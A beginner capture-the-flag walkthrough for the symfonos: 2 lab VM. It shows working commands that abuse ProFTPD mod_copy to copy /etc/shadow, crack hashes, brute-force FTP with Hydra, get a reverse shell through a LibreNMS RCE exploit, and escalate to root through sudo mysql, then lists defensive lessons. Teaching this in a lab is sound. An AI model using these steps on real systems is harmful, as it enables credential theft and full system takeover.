# symfonos: 2 — VulnHub Walkthrough (Beginner Friendly)

> **Educational writeup.** Run this VM only on an isolated, host-only lab network.
> The goal is to understand *why* each step works, not just to copy commands.

| Field | Value |
| --- | --- |
| **Machine** | symfonos: 2 |
| **Difficulty** | Easy / Medium (a great first "chain several bugs together" box) |
| **Author** | Zayotic |
| **Released** | 18 July 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/symfonos-2,331/> |
| **Download** | <https://vulnhub.com/entry/symfonos-2,331/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian-based; Samba + ProFTPD + Apache) |

> **Note:** DHCP is enabled, and exact service versions and flag strings **vary by
> build**. Every output below is *illustrative* — confirm against your own scan.

---

## 0. What you will learn

- How to enumerate **SMB (Samba)** shares, including anonymous access.
- How a **log file** on a share can leak the exact path of a sensitive backup.
- How a **ProFTPD 1.3.5 file-copy flaw (CVE-2015-3306 / EDB 36742)** copies files
  with **no authentication**, letting you pull `/etc/shadow`.
- How to merge `passwd` + `shadow` and crack the hash with **John/Hashcat**.
- How to find a **localhost-only web app** and reach it with an **SSH port-forward**.
- How an old **LibreNMS** version gives an authenticated **RCE** (foothold as `cronus`).
- How a `sudo` rule on **`mysql`** becomes root (GTFOBins).

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You need Kali running and the ability to import
the VM and attach it to a host-only network.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network.

```bash
# See your own IP / lab subnet first
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your Kali box holds a `192.168.56.x` (VirtualBox host-only) or
> `192.168.19x.x` (VMware) address. The target is on the **same** subnet.

```bash
# ARP-scan the subnet to list live hosts (fast: uses ARP, not a full TCP sweep)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.1    08:00:27:xx:xx:xx   PCS Systemtechnik GmbH
192.168.56.10   08:00:27:aa:aa:aa   PCS Systemtechnik GmbH   <-- you (Kali)
192.168.56.101  08:00:27:bb:bb:bb   PCS Systemtechnik GmbH   <-- the target
```

**Target IP:** `192.168.56.101`

![arp-scan finding the target](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Port scanning

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,22,80,139,445 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp  open  http        WebFS httpd 1.21
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

> **Why it works:** `-p-` scans every TCP port; `-sV` fingerprints versions; `-sC` runs
> safe default scripts. Five services = five possible ways in. The **old versions**
> (ProFTPD 1.3.5, Samba 3/4) are the first things to research.

![nmap scan of the target](images/02-nmap.png)

### 2.2 SMB enumeration (anonymous access)

```bash
# List shares without credentials (-N = null session)
smbclient -L //192.168.56.101 -N
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Symfonos Anonymous Share
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
```

> **Why it works:** the SMB server allows **guest/null sessions**, so we can list and
> read a share without any username or password. `anonymous` looks very interesting.

```bash
# Connect to the anonymous share and look around
smbclient //192.168.56.101/anonymous -N
```

```text
smb: \> ls
  .                                   D        0  ...
  ..                                  D        0  ...
  backups                             D        0  ...
smb: \> cd backups
smb: \backups\> ls
  log.txt                             N    11394  ...
smb: \backups\> get log.txt
getting file \backups\log.txt of size 11394
smb: \backups\> exit
```

![Reading the anonymous SMB share](images/03-smb-anon.png)

### 2.3 The leaked log file

```bash
cat log.txt
```

```text
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
...
# (Samba configuration dump below)
[anonymous]
   path = /home/aeolus/share           <-- this share maps to aeolus's home
   browseable = yes
   guest ok = yes
...
# (ProFTPD configuration dump)
ServerName      "ProFTPD Default Installation"
...
```

> **Why it works:** a careless admin backed up the **shadow file to
> `/var/backups/shadow.bak`** and left a log of it on a world-readable share. The log
> also tells us the anonymous share is physically `/home/aeolus/share` and reveals the
> username **`aeolus`**. Now we need a way to *read* that shadow backup.

![log.txt leaking shadow.bak path and the share path](images/04-log-txt.png)

### 2.4 ProFTPD 1.3.5 — the file-copy flaw (CVE-2015-3306)

The FTP version is old. Searching for it points to **mod_copy**: unauthenticated
clients can copy files from anywhere to anywhere with `site cpfr` / `site cpto`.

```bash
searchsploit ProFTPD 1.3.5
```

```text
ProFTPd 1.3.3c - File Copy                       | linux/remote/49900.py
ProFTPd 1.3.5 - File Copy                        | linux/remote/36742.txt
```

> **Why it works:** `mod_copy` implements server-side `SITE CPFR`/`SITE CPTO`. It does
> **not** check who is asking. So we can copy root's `shadow.bak` into a directory we
> *can* read (the SMB share) — no password required.

We drive it with a plain `ftp`/`telnet` session:

```bash
ftp 192.168.56.101
```

```text
Connected to 192.168.56.101.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)
Name (192.168.56.101:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
530 Login incorrect.          # login is refused, but SITE CPFR/CPTO still work
ftp> quote site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
ftp> quote site cpto /home/aeolus/share/shadow.bak
250 Copy successful
ftp> quit
```

Repeat the same two commands to copy `/etc/passwd` as well:

```text
ftp> quote site cpfr /etc/passwd
350 File or directory exists, ready for destination name
ftp> quote site cpto /home/aeolus/share/passwd
250 Copy successful
ftp> quit
```

> **Why it works:** this is an **arbitrary file copy** as the FTP daemon user. Because
> the daemon can read `/etc/shadow`'s backup and can write into `aeolus`'s share, we
> effectively exfiltrate sensitive files through a channel we already control (SMB).

Now retrieve both files over the readable SMB share:

```bash
smbclient //192.168.56.101/anonymous -N -c 'cd ..; ls'
smbclient //192.168.56.101/anonymous -N -c 'get shadow.bak'
smbclient //192.168.56.101/anonymous -N -c 'get passwd'
ls -la shadow.bak passwd
```

![Copying shadow.bak via mod_copy and pulling it over SMB](images/05-modcopy.png)

---

## 3. Foothold

### 3.1 Cracking the shadow hash

`/etc/shadow` stores password **hashes**, not plaintext. `/etc/passwd` gives us the
usernames and home directories. Merge them, then crack offline:

```bash
unshadow passwd shadow.bak > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# ...or offline with hashcat:
#   hashcat -m 1800 hashes /usr/share/wordlists/rockyou.txt
```

```text
Loaded 1 password hash (sha512crypt, crypt(3) $6$)
sergioteamo      (aeolus)
1g 0:00:00:05 DONE
```

> **Why it works:** `unshadow` combines the two files into the format John expects.
> The hash is `sha512crypt` (`$6$`), easy to crack when the password is in a wordlist.
> Reusing `rockyou` is why weak passwords fall instantly.

> **Unintended path:** some walkthroughs brute-force FTP with Hydra
> (`hydra -l aeolus -P rockyou.txt ftp://192.168.56.101`) to get the same password.
> The **intended** path is the mod_copy chain above.

### 3.2 SSH in as aeolus

```bash
ssh aeolus@192.168.56.101
# password: sergioteamo
```

```text
aeolus@symfonos2:~$
```

```bash
id
ls -la ~/share
```

```text
uid=1001(aeolus) gid=1001(aeolus) groups=1001(aeolus)
```

> **Why it works:** the recovered credentials are valid system accounts. We now have a
> real interactive shell as `aeolus`.

![SSH as aeolus](images/06-ssh-aeolus.png)

### 3.3 Find a hidden, localhost-only service

```bash
ss -lntp
cat /etc/apache2/ports.conf       # or wherever Apache is configured
```

```text
LISTEN  0  128  127.0.0.1:8080   ...
# ports.conf also shows the site is bound to 8080 on the loopback interface only
```

> **Why it works:** the second web app listens on **127.0.0.1:8080**, so it is invisible
> from outside. But because we are *on* the box via SSH, we can forward the port to Kali.

Forward it using OpenSSH local port forwarding:

```bash
# On Kali (a new terminal):
ssh -L 8080:127.0.0.1:8080 aeolus@192.168.56.101
# Then browse http://127.0.0.1:8080/ on Kali
```

> **Why it works:** `-L` opens a tunnel: connections to Kali's localhost:8080 are
> forwarded over SSH and appear to the target as connections to its own loopback. This
> reaches services that never touch the network.

![Port-forwarding the localhost LibreNMS web app](images/07-portforward.png)

### 3.4 LibreNMS authenticated RCE

The forwarded page is **LibreNMS**. Log in with the same credentials
(`aeolus` / `sergioteamo`). This version is vulnerable to an **authenticated remote
code execution** flaw (CVE-2018-20434) in the device-add feature.

```bash
searchsploit librenms
```

```text
LibreNMS - addhost Authenticated Remote Code Execution | linux/webapps/47975.py
```

```bash
# On Kali: start a listener
nc -lvnp 4444

# Run the exploit, pointing at the forwarded port, with aeolus creds
python3 47975.py -u aeolus -p sergioteamo -i 127.0.0.1
```

```text
www-data@symfonos2:/opt/librenms/html$     # shell as cronus/www-data
```

> **Why it works:** the device-add API builds an OS command from user input without
> sanitising it. An authenticated user can inject `; nc ... -e /bin/sh` and get a
> reverse shell. The web service runs as **`cronus`**.

Upgrade the shell to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then: stty raw -echo; fg   ; and: export TERM=xterm
id
```

```text
uid=1000(cronus) gid=1000(cronus) groups=1000(cronus)
```

![Reverse shell as cronus from the LibreNMS exploit](images/08-cronus-shell.png)

---

## 4. Privilege escalation

```bash
sudo -l
```

```text
User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
```

> **Why it works:** `cronus` may run **`mysql` as root with no password**. `mysql` can
> execute shell commands via its `\!` (or `system`) directive — and since it was started
> as root, the command runs as **root**. This is a documented GTFOBins abuse.

```bash
sudo mysql -e '\! /bin/sh'
```

```text
root@symfonos2:/opt/librenms/html#
```

```bash
id
cd /root
ls -la
cat proof.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
<the root flag — often /root/proof.txt, varies by build>
```

> **Tip:** the exact flag filename varies by build. If `proof.txt` isn't there, run
> `find /root -type f -name '*.txt'` to locate it.

![Root shell and the root flag](images/09-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous/guest SMB share | Samba (139/445), `anonymous` share | Reads internal files (`log.txt`) |
| 2 | Sensitive file left on a readable share | `backups/log.txt` | Leaks `shadow.bak` path + `aeolus` user |
| 3 | Unauthenticated arbitrary file copy | ProFTPD 1.3.5 `mod_copy` (CVE-2015-3306) | Exfiltrates `/etc/shadow`, `/etc/passwd` |
| 4 | Weak password cracked from shadow | Local crack of `aeolus` hash | Valid SSH credentials (`sergioteamo`) |
| 5 | Localhost-only app exposed via forwarding | LibreNMS on `127.0.0.1:8080` | Hidden attack surface reachable |
| 6 | Authenticated RCE | LibreNMS addhost (CVE-2018-20434) | Shell as `cronus` |
| 7 | Dangerous `sudo` rule | `(root) NOPASSWD: /usr/bin/mysql` | Full root via GTFOBins |

---

## 6. Defensive lessons (blue team)

- **Disable anonymous / guest SMB access.** Require credentials for every share, and
  never map a share to a user's home directory by default.
- **Never store backups of sensitive files where others can read them.** `shadow`
  backups must be root-only and encrypted at rest.
- **Patch ProFTPD** (or disable `mod_copy` if unused). CVE-2015-3306 is a 2015 bug —
  unpatched 1.3.5 is an open door.
- **Enforce strong, unique passwords** so a leaked hash isn't trivially cracked; use
  unique per-service secrets.
- **Bind internal services to loopback *and* restrict them further**, but remember
  localhost binding is not a security boundary for a shell user. Apply auth and patch
  internal apps like LibreNMS; keep them up to date (CVE-2018-20434).
- **Principle of least privilege for `sudo`.** Granting `mysql` (or any shell-capable
  binary) as root is equivalent to granting root. Audit `sudoers` regularly.
- **Monitoring:** alert on SMB guest logins, on FTP `SITE CPFR`/`SITE CPTO` commands,
  on `nc`/reverse-shell process trees under the web user, and on `mysql -e '\!...'`.

---

## 7. References

- VulnHub entry — symfonos: 2: <https://vulnhub.com/entry/symfonos-2,331/>
- Author's page — symfonos 2 boot2root: <https://blog.zay.li/symfonos-2-boot2root-ctf/>
- CVE-2015-3306 (ProFTPD mod_copy): <https://nvd.nist.gov/vuln/detail/CVE-2015-3306>
- Exploit-DB 36742 — ProFTPD 1.3.5 File Copy: <https://www.exploit-db.com/exploits/36742>
- CVE-2018-20434 (LibreNMS RCE): <https://nvd.nist.gov/vuln/detail/CVE-2018-20434>
- GTFOBins — `mysql`: <https://gtfobins.github.io/gtfobins/mysql/#sudo>
- mzfr — Symfonos 2 writeup: <https://blog.mzfr.me/vulnhub-writeups/2019-07-19-symfonos2>
- Samba security / smbclient docs: <https://www.samba.org/>

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with arp-scan
- [ ] `images/02-nmap.png` — port/service scan (21, 22, 80, 139, 445)
- [ ] `images/03-smb-anon.png` — listing/reading the anonymous SMB share
- [ ] `images/04-log-txt.png` — `log.txt` leaking `shadow.bak` + share path
- [ ] `images/05-modcopy.png` — mod_copy copying `shadow.bak`, retrieval over SMB
- [ ] `images/06-ssh-aeolus.png` — SSH as `aeolus`
- [ ] `images/07-portforward.png` — forwarding the localhost LibreNMS app
- [ ] `images/08-cronus-shell.png` — reverse shell as `cronus`
- [ ] `images/09-root-flag.png` — root shell and the root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
